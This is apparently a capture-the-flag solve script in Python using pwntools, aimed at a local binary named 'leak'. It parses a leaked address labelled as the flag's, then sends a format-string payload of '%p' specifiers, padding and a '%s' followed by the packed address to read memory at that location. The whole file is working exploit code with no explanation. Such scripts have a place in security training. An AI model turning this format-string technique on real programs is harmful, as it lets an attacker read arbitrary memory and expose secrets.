from pwn import*

p = process('./leak')


p.recvuntil(b'web:\n')
leak = p.recvline()
leak = leak.split(b'|')
print(leak)
leak = leak[2]
leak = int(leak, 16)

log.success("successfully retrieved flag's address: " + hex(leak))
leak = p64(leak)

payload = b'%p' * 0x8 + b'A' * 0x6 + b'%s' + leak

p.recvuntil(b'>')
p.sendline(payload)

p.interactive()
